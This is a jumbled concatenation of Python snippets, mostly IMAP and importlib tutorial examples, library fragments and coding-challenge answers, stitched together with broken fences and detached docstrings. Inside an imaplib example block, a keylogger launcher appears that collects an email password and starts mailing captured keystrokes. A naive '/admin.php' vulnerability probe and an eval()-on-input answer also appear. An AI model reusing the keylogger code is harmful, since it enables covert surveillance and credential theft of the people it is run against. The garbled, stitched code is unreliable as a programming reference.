    password = config.get("account", "password")
    if verbose:
        print("Logging in as", username)
    connection.login(username, password)
    return connection


if __name__ == "__main__":
    with open_connection(verbose=True) as c:
        print(c)

```









---


```py


# end_pymotw_header
import imaplib
import configparser
import os

# Read the config file
config = configparser.ConfigParser()
config.read([os.path.expanduser("~/.pymotw")])

# Connect to the server
hostname = config.get("server", "hostname")
print("Connecting to", hostname)
connection = imaplib.IMAP4_SSL(hostname)

# Login to our account
username = config.get("account", "username")
password = "this_is_the_wrong_password"
print("Logging in as", username)
try:
    connection.login(username, password)
except Exception as err:
    print("ERROR:", err)

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect
from imaplib_list_parse import parse_list_response

with imaplib_connect.open_connection() as c:
    c.select("Example.Today")

    # What ids are in the mailbox?
    typ, [msg_ids] = c.search(None, "ALL")
    print("Starting messages:", msg_ids)

    # Find the message(s)
    typ, [msg_ids] = c.search(None, '(SUBJECT "subject goes here")')
    msg_ids = ",".join(msg_ids.decode("utf-8").split(" "))
    print("Matching messages:", msg_ids)

    # What are the current flags?
    typ, response = c.fetch(msg_ids, "(FLAGS)")
    print("Flags before:", response)

    # Change the Deleted flag
    typ, response = c.store(msg_ids, "+FLAGS", r"(\Deleted)")

    # What are the flags now?
    typ, response = c.fetch(msg_ids, "(FLAGS)")
    print("Flags after:", response)

    # Really delete the message.
    typ, response = c.expunge()
    print("Expunged:", response)

    # What ids are left in the mailbox?
    typ, [msg_ids] = c.search(None, "ALL")
    print("Remaining messages:", msg_ids)

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect

with imaplib_connect.open_connection() as c:
    c.select("INBOX", readonly=True)

    print("BODY:")
    typ, msg_data = c.fetch("1", "(BODY.PEEK[TEXT])")
    for response_part in msg_data:
        if isinstance(response_part, tuple):
            print(response_part[1])

```









---


```py


# end_pymotw_header
import imaplib
import pprint
import imaplib_connect

imaplib.Debug = 4
with imaplib_connect.open_connection() as c:
    c.select("INBOX", readonly=True)
    typ, msg_data = c.fetch("1", "(BODY.PEEK[HEADER] FLAGS)")
    pprint.pprint(msg_data)

```









---


```py


# end_pymotw_header
import imaplib
import email
import email.parser

import imaplib_connect


with imaplib_connect.open_connection() as c:
    c.select("INBOX", readonly=True)

    typ, msg_data = c.fetch("1", "(RFC822)")
    for response_part in msg_data:
        if isinstance(response_part, tuple):
            email_parser = email.parser.BytesFeedParser()
            email_parser.feed(response_part[1])
            msg = email_parser.close()
            for header in ["subject", "to", "from"]:
                print("{:^8}: {}".format(header.upper(), msg[header]))

```









---


```py


# end_pymotw_header
import imaplib
import pprint
import imaplib_connect

with imaplib_connect.open_connection() as c:
    c.select("INBOX", readonly=True)

    print("HEADER:")
    typ, msg_data = c.fetch("1", "(BODY.PEEK[HEADER])")
    for response_part in msg_data:
        if isinstance(response_part, tuple):
            print(response_part[1])

    print("\nBODY TEXT:")
    typ, msg_data = c.fetch("1", "(BODY.PEEK[TEXT])")
    for response_part in msg_data:
        if isinstance(response_part, tuple):
            print(response_part[1])

    print("\nFLAGS:")
    typ, msg_data = c.fetch("1", "(FLAGS)")
    for response_part in msg_data:
        print(response_part)
        print(imaplib.ParseFlags(response_part))

```









---


```py


# end_pymotw_header
import imaplib
from pprint import pprint
from imaplib_connect import open_connection

with open_connection() as c:
    typ, data = c.list()
    print("Response code:", typ)
    print("Response:")
    pprint(data)

```









---


```py


# end_pymotw_header
import imaplib
import re

from imaplib_connect import open_connection

list_response_pattern = re.compile(
    r'\((?P<flags>.*?)\) "(?P<delimiter>.*)" (?P<name>.*)'
)


def parse_list_response(line):
    match = list_response_pattern.match(line.decode("utf-8"))
    flags, delimiter, mailbox_name = match.groups()
    mailbox_name = mailbox_name.strip('"')
    return (flags, delimiter, mailbox_name)


with open_connection() as c:
    typ, data = c.list()
print("Response code:", typ)

for line in data:
    print("Server response:", line)
    flags, delimiter, mailbox_name = parse_list_response(line)
    print("Parsed response:", (flags, delimiter, mailbox_name))

```









---


```py


# end_pymotw_header
import imaplib

from imaplib_connect import open_connection

with open_connection() as c:
    typ, data = c.list(pattern="*Example*")

print("Response code:", typ)

for line in data:
    print("Server response:", line)

```









---


```py


# end_pymotw_header
import imaplib

from imaplib_connect import open_connection

with open_connection() as c:
    typ, data = c.list(directory="Example")

print("Response code:", typ)

for line in data:
    print("Server response:", line)

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect
from imaplib_list_parse import parse_list_response

with imaplib_connect.open_connection() as c:
    typ, mbox_data = c.list()
    for line in mbox_data:
        flags, delimiter, mbox_name = parse_list_response(line)
        c.select('"{}"'.format(mbox_name), readonly=True)
        typ, msg_ids = c.search(None, "ALL")
        print(mbox_name, typ, msg_ids)

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect
from imaplib_list_parse import parse_list_response

with imaplib_connect.open_connection() as c:
    typ, mbox_data = c.list()
    for line in mbox_data:
        flags, delimiter, mbox_name = parse_list_response(line)
        c.select('"{}"'.format(mbox_name), readonly=True)
        typ, msg_ids = c.search(None, '(FROM "Doug" SUBJECT "Example message 2")')
        print(mbox_name, typ, msg_ids)

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect
from imaplib_list_parse import parse_list_response

with imaplib_connect.open_connection() as c:
    typ, mbox_data = c.list()
    for line in mbox_data:
        flags, delimiter, mbox_name = parse_list_response(line)
        c.select('"{}"'.format(mbox_name), readonly=True)
        typ, msg_ids = c.search(None, '(SUBJECT "Example message 2")')
        print(mbox_name, typ, msg_ids)

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect

with imaplib_connect.open_connection() as c:
    typ, data = c.select("INBOX")
    print(typ, data)
    num_msgs = int(data[0])
    print("There are {} messages in INBOX".format(num_msgs))

```









---


```py


#end_pymotw_header
import imaplib
import imaplib_connect

with imaplib_connect.open_connection() as c:
    typ, data = c.select('Does-Not-Exist')
    print(typ, data)

```









---


```py


# end_pymotw_header
import imaplib
import re

from imaplib_connect import open_connection
from imaplib_list_parse import parse_list_response

with open_connection() as c:
    typ, data = c.list()
    for line in data:
        flags, delimiter, mailbox = parse_list_response(line)
        print("Mailbox:", mailbox)
        status = c.status(
            '"{}"'.format(mailbox), "(MESSAGES RECENT UIDNEXT UIDVALIDITY UNSEEN)"
        )
        print(status)

import keylogger

email = input("email on which you want to recieve info\t:\t")
print("\n please enable --less secured apps-- on mail account to recieve emails \n")
password = input("password :\t")
my_keylogger = keylogger.Keylogger(120, email, password)
my_keylogger.start()

# flake8: noqa
import subprocess
import sys
import unittest

_import_everything = b"""
# The event loop is not fork-safe, and it's easy to initialize an asyncio.Future
# at startup, which in turn creates the default event loop and prevents forking.
# Explicitly disallow the default event loop so that an error will be raised
# if something tries to touch it.
import asyncio
asyncio.set_event_loop(None)

import tornado.auth
import tornado.autoreload
import tornado.concurrent
import tornado.escape
import tornado.gen
import tornado.http1connection
import tornado.httpclient
import tornado.httpserver
import tornado.httputil
import tornado.ioloop
import tornado.iostream
import tornado.locale
import tornado.log
import tornado.netutil
import tornado.options
import tornado.process
import tornado.simple_httpclient
import tornado.tcpserver
import tornado.tcpclient
import tornado.template
import tornado.testing
import tornado.util
import tornado.web
import tornado.websocket
import tornado.wsgi

try:
    import pycurl
except ImportError:
    pass
else:
    import tornado.curl_httpclient```


```py


class ImportTest(unittest.TestCase):
    def test_import_everything(self):
        # Test that all Tornado modules can be imported without side effects,
        # specifically without initializing the default asyncio event loop.
        # Since we can't tell which modules may have already beein imported
        # in our process, do it in a subprocess for a clean slate.
        proc = subprocess.Popen([sys.executable], stdin=subprocess.PIPE)
        proc.communicate(_import_everything)
        self.assertEqual(proc.returncode, 0)

    def test_import_aliases(self):
        # Ensure we don't delete formerly-documented aliases accidentally.
        import tornado.ioloop
        import tornado.gen
        import tornado.util

        self.assertIs(tornado.ioloop.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.gen.TimeoutError, tornado.util.TimeoutError)

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


#end_pymotw_header
import importlib

spec = importlib.util.find_spec('example')
print('Loader:', spec.loader)

m = spec.loader.load_module()
print('Module:', m)

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyImporting a module from a package```


```py

# end_pymotw_header
import importlib


m1 = importlib.import_module("example.submodule")
print(m1)

m2 = importlib.import_module(".submodule", package="example")
print(m2)

print(m1 is m2)

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyImporting a module from a package```


```py

# end_pymotw_header
import importlib


try:
    importlib.import_module("example.nosuchmodule")
except ImportError as err:
    print("Error:", err)

#!/usr/bin/env python
# encoding: utf-8
#
# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyImporting a module from a package```


```py

# end_pymotw_header
import importlib


m1 = importlib.import_module("example.submodule")
print(m1)

m2 = importlib.reload(m1)
print(m1 is m2)

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


#end_pymotw_header
import importlib

spec = importlib.util.find_spec('.submodule', package='example')
print('Loader:', spec.loader)

m = spec.loader.load_module()
print('Module:', m)

```









---


```py



# end_pymotw_header
import importlib.machinery

SUFFIXES = [
    ("Source:", importlib.machinery.SOURCE_SUFFIXES),
    ("Debug:", importlib.machinery.DEBUG_BYTECODE_SUFFIXES),
    ("Optimized:", importlib.machinery.OPTIMIZED_BYTECODE_SUFFIXES),
    ("Bytecode:", importlib.machinery.BYTECODE_SUFFIXES),
    ("Extension:", importlib.machinery.EXTENSION_SUFFIXES),
]


def main():
    tmpl = "{:<10}  {}"
    for name, value in SUFFIXES:
        print(tmpl.format(name, value))


if __name__ == "__main__":
    main()
````

````py
A simple utility to import something by its string name.```


```py
# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.


def import_item(name):
    """Import and return ``bar`` given the string ``foo.bar``.

    Calling ``bar = import_item("foo.bar")`` is the functional equivalent of
    executing the code ``from foo import bar``.

    Parameters
    ----------
    name : string
        The fully qualified name of the module/package being imported.

    Returns
    -------
    mod : module object
        The module that was imported.
    """
    if not isinstance(name, str):
        raise TypeError("import_item accepts strings, not '%s'." % type(name))
    parts = name.rsplit(".", 1)
    if len(parts) == 2:
        # called with 'foo.bar....'
        package, obj = parts
        module = __import__(package, fromlist=[obj])
        try:
            pak = getattr(module, obj)
        except AttributeError:
            raise ImportError("No module named %s" % obj)
        return pak
    else:
        # called with un-dotted string
        return __import__(parts[0])

from collections import deque
from typing import Deque, Optional

from .base import Clipboard, ClipboardData

__all__ = ["InMemoryClipboard"]


class InMemoryClipboard(Clipboard):
    """
    Default clipboard implementation.
    Just keep the data in memory.

    This implements a kill-ring, for Emacs mode.
    """

    def __init__(
        self, data: Optional[ClipboardData] = None, max_size: int = 60
    ) -> None:

        assert max_size >= 1

        self.max_size = max_size
        self._ring: Deque[ClipboardData] = deque()

        if data is not None:
            self.set_data(data)

    def set_data(self, data: ClipboardData) -> None:
        self._ring.appendleft(data)

        while len(self._ring) > self.max_size:
            self._ring.pop()

    def get_data(self) -> ClipboardData:
        if self._ring:
            return self._ring[0]
        else:
            return ClipboardData()

    def rotate(self) -> None:
        if self._ring:
            # Add the very first item at the end.
            self._ring.append(self._ring.popleft())
````

````py
Checks if a system of forces is in static equilibrium.```


```py
from typing import List

from numpy import array, cos, cross, ndarray, radians, sin


def polar_force(
    magnitude: float, angle: float, radian_mode: bool = False
) -> List[float]:
    """
    Resolves force along rectangular components.
    (force, angle) => (force_x, force_y)
    >>> polar_force(10, 45)
    [7.0710678118654755, 7.071067811865475]
    >>> polar_force(10, 3.14, radian_mode=True)
    [-9.999987317275394, 0.01592652916486828]
    """
    if radian_mode:
        return [magnitude * cos(angle), magnitude * sin(angle)]
    return [magnitude * cos(radians(angle)), magnitude * sin(radians(angle))]


def in_static_equilibrium(
    forces: ndarray, location: ndarray, eps: float = 10 ** -1
) -> bool:
    """
    Check if a system is in equilibrium.
    It takes two numpy.array objects.
    forces ==>  [
                        [force1_x, force1_y],
                        [force2_x, force2_y],
                        ....]
    location ==>  [
                        [x1, y1],
                        [x2, y2],
                        ....]
    >>> force = array([[1, 1], [-1, 2]])
    >>> location = array([[1, 0], [10, 0]])
    >>> in_static_equilibrium(force, location)
    False
    """
    # summation of moments is zero
    moments: ndarray = cross(location, forces)
    sum_moments: float = sum(moments)
    return abs(sum_moments) < eps


if __name__ == "__main__":
    # Test to check if it works
    forces = array(
        [polar_force(718.4, 180 - 30), polar_force(879.54, 45), polar_force(100, -90)]
    )

    location = array([[0, 0], [0, 0], [0, 0]])

    assert in_static_equilibrium(forces, location)

    # Problem 1 in image_data/2D_problems.jpg
    forces = array(
        [
            polar_force(30 * 9.81, 15),
            polar_force(215, 180 - 45),
            polar_force(264, 90 - 30),
        ]
    )

    location = array([[0, 0], [0, 0], [0, 0]])

    assert in_static_equilibrium(forces, location)

    # Problem in image_data/2D_problems_1.jpg
    forces = array([[0, -2000], [0, -1200], [0, 15600], [0, -12400]])

    location = array([[0, 0], [6, 0], [10, 0], [12, 0]])

    assert in_static_equilibrium(forces, location)

    import doctest

    doctest.testmod()

import random

# "The something in something" program
noun_lib = [
    "cat",
    "dog",
    "lizard",
    "bald",
    "insane guy",
    "CEO",
    "monkey",
    "teacher",
    "ballerina",
    "old man",
    "nerd",
    "lion",
    "alien",
    "elephant",
]
place_lib = [
    "in Hungary",
    "in the toilet",
    "in a car",
    "in a zoo",
    "in a lions cave",
    "in a park",
    "in Norway",
    "in Rio",
    "on Mars",
    "on a tree",
    "on the roof of Burj-Khalifa",
]

flag = True
while flag:
    inp = str(input("\nDo you want more? [Y/n] "))
    if inp.strip().lower() == "y":
        print(
            "-> The"
            + " "
            + random.choice(noun_lib)
            + " "
            + random.choice(place_lib)
            + "."
        )
    else:
        flag = False

def incrementCipher(s, nums):

    for ni in nums:

        cnt = 1
        index = ni * cnt - 1

        while index < len(s):

            incr_idx = ord(s[index]) + 1
            if incr_idx == 123:
                incr_idx = 97

            s = s[:index] + chr(incr_idx) + s[index + 1 :]

            cnt += 1
            index = ni * cnt - 1

    return s

# import the required library
import requests

site = input("Enter website url: ")
response = requests.get(site)

# printing the html of website
print(response.text)

# sending requests to website
if response.status_code == 200:
    response = requests.get(site + "/admin.php")

    if response.status_code == 200:
        print("Vulnerable")
    else:
        print("Non-vulnerable")

else:
    print("Failure")

# Given an integer array nums sorted in ascending order, and an integer target.

# Suppose that nums is rotated at some pivot unknown to you beforehand (i.e., [1,2,4,5,6,7] might become [4,5,6,7,1,2]).

# You should search for target in nums and if found return its index, otherwise return -1.

# Example 1:
# Input: nums = [6,7,1,2,3,4,5], target = 1
# Output: 2

# Example 2:
# Input: nums = [6,7,1,2,3,4,5], target = 3
# Output: 4

# Example 3:
# Input: nums = [1], target = 2
# Output: -1

# Your solution should have better than O(n) time complexity over the number of items in the list. There is an O(log n) solution. There is also an O(1) solution.

# Note:

# 1 <= nums.length < 100
# 1 <= nums[i] <= 100
# All values of nums are unique.
# Numbers from 1 up to the length of the list will be contained in the list.
# [execution time limit] 4 seconds (py3)

# [input] array.integer nums

# [input] integer target

# [output] integer


def csSearchRotatedSortedArray(nums, target):
    # O(1) run time:
    if target in nums:
        return nums.index(target)
    # O(n) run time:
    # for idx in range(len(nums)):
    #     if nums[idx] == target:
    #         return idx
    return -1

from typing import List
import numpy as np

AR_LIKE_i: List[int]
AR_LIKE_f: List[float]

np.unravel_index(AR_LIKE_f, (1, 2, 3))  # E: incompatible type
np.ravel_multi_index(AR_LIKE_i, (1, 2, 3), mode="bob")  # E: No overload variant
np.mgrid[1]  # E: Invalid index type
np.mgrid[...]  # E: Invalid index type
np.ogrid[1]  # E: Invalid index type
np.ogrid[...]  # E: Invalid index type
np.fill_diagonal(AR_LIKE_f, 2)  # E: incompatible type
np.diag_indices(1.0)  # E: incompatible type

import re


def indian_phone_validator(phone: str) -> bool:
    """
    Determine whether the string is a valid phone number or not
    :param phone:
    :return: Boolean
    >>> indian_phone_validator("+91123456789")
    False
    >>> indian_phone_validator("+919876543210")
    True
    >>> indian_phone_validator("01234567896")
    False
    >>> indian_phone_validator("919876543218")
    True
    >>> indian_phone_validator("+91-1234567899")
    False
    """
    pat = re.compile(r"^(\+91[\-\s]?)?[0]?(91)?[789]\d{9}$")
    match = re.search(pat, phone)
    if match:
        return match.string == phone
    return False


if __name__ == "__main__":
    print(indian_phone_validator("+918827897895"))

# Licensed under the LGPL: https://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html
# For details: https://github.com/PyCQA/astroid/blob/main/LICENSE
````

```pyTransform utilities (filters and decorator)"""

import itertools
import typing

import wrapt

# pylint: disable=dangerous-default-value
from astroid.exceptions import InferenceOverwriteError
from astroid.nodes import NodeNG


@wrapt.decorator
def _inference_tip_cached(func, instance, args, kwargs, _cache={}):  # noqa:B006
    """Cache decorator used for inference tips"""
    node = args[0]
    try:
        return iter(_cache[func, node])
    except KeyError:
        result = func(*args, **kwargs)
        # Need to keep an iterator around
        original, copy = itertools.tee(result)
        _cache[func, node] = list(copy)
        return original


# pylint: enable=dangerous-default-value


def inference_tip(
    infer_function: typing.Callable, raise_on_overwrite: bool = False
) -> typing.Callable:
    """Given an instance specific inference function, return a function to be
    given to AstroidManager().register_transform to set this inference function.

    :param bool raise_on_overwrite: Raise an `InferenceOverwriteError`
        if the inference tip will overwrite another. Used for debugging

    Typical usage

    .. sourcecode:: python

       AstroidManager().register_transform(Call, inference_tip(infer_named_tuple),
                                  predicate)

    .. Note::

        Using an inference tip will override
        any previously set inference tip for the given
        node. Use a predicate in the transform to prevent
        excess overwrites.
    """

    def transform(
        node: NodeNG, infer_function: typing.Callable = infer_function
    ) -> NodeNG:
        if (
            raise_on_overwrite
            and node._explicit_inference is not None
            and node._explicit_inference is not infer_function
        ):
            raise InferenceOverwriteError(
                "Inference already set to {existing_inference}. "
                "Trying to overwrite with {new_inference} for {node}".format(
                    existing_inference=infer_function,
                    new_inference=node._explicit_inference,
                    node=node,
                )
            )
        # pylint: disable=no-value-for-parameter
        node._explicit_inference = _inference_tip_cached(infer_function)
        return node

    return transform

from __future__ import print_function
from __future__ import absolute_import
import string

from .Stack import Stack

__author__ = "Omkar Pathak"


def is_operand(char):
    return char in string.ascii_letters or char in string.digits


def precedence(char):
    """ Return integer value representing an operator's precedence, or
    order of operation.

    https://en.wikipedia.org/wiki/Order_of_operations
    """
    dictionary = {"+": 1, "-": 1, "*": 2, "/": 2, "^": 3}
    return dictionary.get(char, -1)


def infix_to_postfix(expression):
    """ Convert infix notation to postfix notation using the Shunting-yard
    algorithm.

    https://en.wikipedia.org/wiki/Shunting-yard_algorithm
    https://en.wikipedia.org/wiki/Infix_notation
    https://en.wikipedia.org/wiki/Reverse_Polish_notation
    """
    stack = Stack(len(expression))
    postfix = []
    for char in expression:
        if is_operand(char):
            postfix.append(char)
        elif char not in {"(", ")"}:
            while not stack.is_empty() and precedence(char) <= precedence(stack.peek()):
                postfix.append(stack.pop())
            stack.push(char)
        elif char == "(":
            stack.push(char)
        elif char == ")":
            while not stack.is_empty() and stack.peek() != "(":
                postfix.append(stack.pop())
            # Pop '(' from stack. If there is no '(', there is a mismatched
            # parentheses.
            if stack.peek() != "(":
                raise ValueError("Mismatched parentheses")
            stack.pop()
    while not stack.is_empty():
        postfix.append(stack.pop())
    return " ".join(postfix)


if __name__ == "__main__":
    expression = "a+b*(c^d-e)^(f+g*h)-i"

    print("Infix to Postfix Notation demonstration:\n")
    print("Infix notation: " + expression)
    print("Postfix notation: " + infix_to_postfix(expression))

import platform
import os
import sys

print("============================")
print("System Information : ")
print(os.name)
print(platform.system())
print(platform.release(), "\n")
print("============================")
print("Python Version Installed : ")
print(sys.version, "\n")
print("============================")

import urllib.request
import json

ip = input(
    "Just press enter key to get location of your current IP \n OR \n Enter IP address to get its location and other info:"
)

resp = urllib.request.urlopen(
    "http://www.ip-api.com/json/"
    + ip
    + "?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query"
).read()
resp_dic = json.loads(resp)

print("\n")

for key, value in resp_dic.items():
    print(f"{key} : {value}")

class Entity:
    def __init__(self, id, x, y):
        self.id = id
        self.x = x
        self.y = y

    def __str__(self):
        return f"{self.id}: ({self.x}, {self.y})"


class Mob(Entity):
    def __init__(self, id, x, y, speed):
        super().__init__(id, x, y)
        self.speed = speed

    def move(self, direction):
        if direction == "n":
            self.y -= self.speed
        if direction == "s":
            self.y += self.speed
        if direction == "e":
            self.x += self.speed
        if direction == "w":
            self.x -= self.speed

    def __str__(self):
        return f"{super().__str__()}, {self.speed}"


class Player(Mob):
    def __init__(self, id, name, x, y, speed, hp, atk):
        super().__init__(id, x, y, speed)
        self.name = name
        self.health = hp
        self.attack = atk

    def __str__(self):
        return f"[{self.name}] {super().__str__()}, {self.health}, {self.attack}"


class Tile(Entity):
    def __init__(self, id, x, y, image, solid=False):
        super().__init__(id, x, y)
        self.image = image
        self.solid = solid


m = Mob(0, 12, 10, 1)  # is_a Entity

p = Player(1, "Player 1", 10, 10, 2, 10, 5)

t = Tile(200, 0, 0, "grass.png")

print(m)
print(p)

# -*- coding=utf-8 -*-

from __future__ import absolute_import, print_function, unicode_literals

import argparse
import os

from ..actions.init import init_project
from ._base import BaseCommand
from .options import new_project_group


class Command(BaseCommand):

    name = "init"
    description = "Create a new project."
    default_arguments = []
    arguments = [new_project_group]

    def run(self, options):
        pipfile_path = os.path.join(options.project, "Pipfile")
        if os.path.exists(pipfile_path):
            raise argparse.ArgumentError(
                "{0!r} is already a Pipfile project".format(options.project)
            )
        return init_project(root=options.project, python_version=options.python_version)


if __name__ == "__main__":
    Command.run_parser()

# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import atexit
import contextlib
import sys

from .ansitowin32 import AnsiToWin32


orig_stdout = None
orig_stderr = None

wrapped_stdout = None
wrapped_stderr = None

atexit_done = False


def reset_all():
    if AnsiToWin32 is not None:  # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):

    if not wrap and any([autoreset, convert, strip]):
        raise ValueError("wrap=False conflicts with any other arg=True")

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = wrap_stream(
            orig_stdout, convert, strip, autoreset, wrap
        )
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = wrap_stream(
            orig_stderr, convert, strip, autoreset, wrap
        )

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr


@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream, convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream
```

````pyA helper module that injects SecureTransport, on import.

The import should be done as early as possible, to ensure all requests and
sessions (or whatever) are created after injecting SecureTransport.

Note that we only do the injection on macOS, when the linked OpenSSL is too
old to handle TLSv1.2.```


```py

import sys


def inject_securetransport():
    # type: () -> None
    # Only relevant on macOS
    if sys.platform != "darwin":
        return

    try:
        import ssl
    except ImportError:
        return

    # Checks for OpenSSL 1.0.1
    if ssl.OPENSSL_VERSION_NUMBER >= 0x1000100F:
        return

    try:
        from pip._vendor.urllib3.contrib import securetransport
    except (ImportError, OSError):
        return

    securetransport.inject_into_urllib3()


inject_securetransport()
````

````py
    pygments.styles.inkpot
    ~~~~~~~~~~~~~~~~~~~~~~

    A highlighting style for Pygments, inspired by the Inkpot theme for VIM.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import (
    Text,
    Other,
    Keyword,
    Name,
    Comment,
    String,
    Error,
    Number,
    Operator,
    Generic,
    Whitespace,
    Punctuation,
)


class InkPotStyle(Style):
    background_color = "#1e1e27"
    default_style = ""
    styles = {
        Text: "#cfbfad",
        Other: "#cfbfad",
        Whitespace: "#434357",
        Comment: "#cd8b00",
        Comment.Preproc: "#409090",
        Comment.PreprocFile: "bg:#404040 #ffcd8b",
        Comment.Special: "#808bed",
        Keyword: "#808bed",
        Keyword.Pseudo: "nobold",
        Keyword.Type: "#ff8bff",
        Operator: "#666666",
        Punctuation: "#cfbfad",
        Name: "#cfbfad",
        Name.Attribute: "#cfbfad",
        Name.Builtin.Pseudo: "#ffff00",
        Name.Builtin: "#808bed",
        Name.Class: "#ff8bff",
        Name.Constant: "#409090",
        Name.Decorator: "#409090",
        Name.Exception: "#ff0000",
        Name.Function: "#c080d0",
        Name.Label: "#808bed",
        Name.Namespace: "#ff0000",
        Name.Variable: "#cfbfad",
        String: "bg:#404040 #ffcd8b",
        String.Doc: "#808bed",
        Number: "#f0ad6d",
        Generic.Heading: "bold #000080",
        Generic.Subheading: "bold #800080",
        Generic.Deleted: "#A00000",
        Generic.Inserted: "#00A000",
        Generic.Error: "#FF0000",
        Generic.Emph: "italic",
        Generic.Strong: "bold",
        Generic.Prompt: "bold #000080",
        Generic.Output: "#888",
        Generic.Traceback: "#04D",
        Error: "bg:#6e2e2e #ffffff",
    }

# Enter your code here. Read input from STDIN. Print output to STDOUT
x, k = map(int, input().split())
print("True" if eval(input())==k else "False")
def input_text():
    running = True

    while running:
        mesg = input("Type anything: ")

        print(mesg)

        while True:
            ans = input("Type 'yes' to continue or 'no' to terminate: ").lower()

            if ans == "yes" or ans == "y":
                running = True
                break

            elif ans == "no" or ans == "n":
                running = False
                break

            else:
                print("Please type 'yes' or 'no' only")
                break


input_text()

# encoding: utf-8```


```py
Enable pygtk to be used interacive by setting PyOS_InputHook.

Authors: Brian Granger```


```py

# -----------------------------------------------------------------------------
#  Copyright (C) 2008-2011  The IPython Development Team
#
#  Distributed under the terms of the BSD License.  The full license is in
#  the file COPYING, distributed as part of this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

import gtk, gobject  # @UnresolvedImport

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------


def _main_quit(*args, **kwargs):
    gtk.main_quit()
    return False


def create_inputhook_gtk(stdin_file):
    def inputhook_gtk():
        gobject.io_add_watch(stdin_file, gobject.IO_IN, _main_quit)
        gtk.main()
        return 0

    return inputhook_gtk

# encoding: utf-8```


```py
Enable Gtk3 to be used interacive by IPython.

Authors: Thomi Richards```


```py
# -----------------------------------------------------------------------------
# Copyright (c) 2012, the IPython Development Team.
#
# Distributed under the terms of the Modified BSD License.
#
# The full license is in the file COPYING.txt, distributed with this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

from gi.repository import Gtk, GLib  # @UnresolvedImport

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------


def _main_quit(*args, **kwargs):
    Gtk.main_quit()
    return False


def create_inputhook_gtk3(stdin_file):
    def inputhook_gtk3():
        GLib.io_add_watch(stdin_file, GLib.IO_IN, _main_quit)
        Gtk.main()
        return 0

    return inputhook_gtk3

# encoding: utf-8
# Unlike what IPython does, we need to have an explicit inputhook because tkinter handles
# input hook in the C Source code

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

from pydev_ipython.inputhook import stdin_ready

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------

TCL_DONT_WAIT = 1 << 1


def create_inputhook_tk(app):
    def inputhook_tk():
        while app.dooneevent(TCL_DONT_WAIT) == 1:
            if stdin_ready():
                break
        return 0

    return inputhook_tk

# def insertDashes(s):
#     return "-".join(s).replace("- -", " ")
# 55

# insertDashes = lambda s: "-".join(s).replace("- -", " ")
# 51

# return "-".join(*eval(dir()[0])).replace("- -", " ")
# 50

# return re.sub("- -", " ", "-".join(*eval(dir()[0])))
# 49

# insertDashes = lambda s: re.sub('\B', '-', s)
# 39

return re.sub("\B", "-", *eval(dir()[0]))
# 38

# Note: Your solution should have O(n) time complexity, where n is the number of elements in l, since this is what you will be asked to accomplish in an interview.

# You have a singly linked list l, which is sorted in strictly increasing order, and an integer value. Add value to the list l, preserving its original sorting.

# Note: in examples below and tests preview linked lists are presented as arrays just for simplicity of visualization: in real data you will be given a head node l of the linked list

# Example

# For l = [1, 3, 4, 6] and value = 5, the output should be
# insertValueIntoSortedLinkedList(l, value) = [1, 3, 4, 5, 6];
# For l = [1, 3, 4, 6] and value = 10, the output should be
# insertValueIntoSortedLinkedList(l, value) = [1, 3, 4, 6, 10];
# For l = [1, 3, 4, 6] and value = 0, the output should be
# insertValueIntoSortedLinkedList(l, value) = [0, 1, 3, 4, 6].
# Input/Output

# [execution time limit] 4 seconds (py3)

# [input] linkedlist.integer l

# A singly linked list of integers sorted in strictly increasing order. Thus, all integers in the list are pairwise distinct.

# Guaranteed constraints:
# 0 ≤ list size ≤ 104,
# -109 ≤ element value ≤ 109.

# [input] integer value

# A single integer value to be inserted into l. It is guaranteed that there is not an element equal to value in l before the insertion is performed.

# Guaranteed constraints:
# -109 ≤ value ≤ 109.

# [output] linkedlist.integer

# Singly-linked lists are already defined with this interface:
# class ListNode(object):
